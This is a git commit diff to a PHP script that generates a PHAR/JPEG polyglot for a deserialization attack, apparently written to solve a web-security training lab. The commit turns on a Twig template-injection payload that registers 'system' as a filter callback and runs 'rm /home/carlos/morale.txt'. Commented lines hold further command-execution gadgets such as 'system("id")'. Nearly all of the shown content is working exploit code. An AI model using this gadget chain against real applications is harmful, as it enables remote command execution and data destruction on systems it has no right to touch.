bcc19bb0bbeb99e444ba802b72b670b1f1968eb0
hoangdat2407 <82460838+hoangdat2407@users.noreply.github.com>
2026-06-16 09:20:40 +0700

    Save phar_jpg_polyglot.php at 2026-06-16 09:20:40

--- phar_jpg_polyglot.php
+++ phar_jpg_polyglot.php
@@ -100,13 +100,13 @@ function generate_polyglot($phar, $jpeg){
 // $object = new PHPObjectInjection;
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
-// $blog = new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}");
+$blog = new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}");
 
-// $object = new CustomTemplate($blog);
-$blog = new Blog("abc","abc");
-$blog->desc = "{{7*7}}";
-$blog->user = 'user';
 $object = new CustomTemplate($blog);
+// $object = new CustomTemplate;
+// $blog = new Blog;
+// $blog->desc = "{{7*7}}";
+// $blog->user = 'user';
 // $object->template_file_path = $blog;
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
